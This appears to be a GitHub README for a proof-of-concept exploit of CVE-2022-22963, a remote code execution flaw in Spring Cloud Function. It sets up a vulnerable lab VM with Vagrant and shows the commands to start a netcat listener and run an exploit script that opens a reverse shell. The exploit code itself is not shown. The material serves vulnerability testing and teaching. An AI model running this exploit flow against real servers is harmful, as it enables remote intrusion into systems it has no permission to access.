# CVE-2022-22963 Exploit

## Description


In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources. more details can be found in the [CVE-2022-22963 Detail](https://nvd.nist.gov/vuln/detail/CVE-2022-22963).

Based on the PoC provided by [AayushmanThapaMagar](https://github.com/AayushmanThapaMagar/CVE-2022-22963), I am creating a simple exploit of this vulnerability to get a reverse shell from the vulnerable server.

The porpuse of this project is to make it easier to test the vulnerability and to learn how to exploit it. I will add more details about the reason behind this vulnerability later.
## Requirements

To run this exploit, you only need:

- Vagrant: to create the VM with the vulnerable server, you can download it from [here](https://www.vagrantup.com/downloads).

- Virtualization software: Vagrant uses virtualization software like VirtualBox, VMware, or Hyper-V to create and manage virtual environments. I recommend you to use VirtualBox, you can download it from [here](https://www.virtualbox.org/wiki/Downloads).

## Usage

First, create a directory and put the `Vagrantfile` file inside it, or just clone this repository. Other files will be used by Vagrant to create the VM.

```bash
mkdir CVE-2022-22963
cd CVE-2022-22963
wget https://github.com/iliass-dahman/CVE-2022-22963-POC/blob/main/Vagrantfile
```

Then, run the following command to create the VM and start the vulnerable server:

```bash
vagrant up
```

After the VM is created, you can access it using the following command:

```bash
vagrant ssh
```

Now, to run the exploit, first, run the listener on the VM in the background:

```bash
nc -lp 8998 &
```

Then, run the exploit:

```bash
cd CVE-2022-22963-POC
python3 exploit.py http://127.0.0.1:8080 127.0.0.1 8998
```
- http://127.0.0.1:8080: the URL of the vulnerable server.
- 127.0.0.1: the IP of the attacker.
- 8998: the port of the listener.

Now you should see a response like this:

```bash
Exploit successfull!
Check your listener
```

Now, return to your listener:

```bash
fg %1
```
Congratulations, you got a reverse shell, you can test it.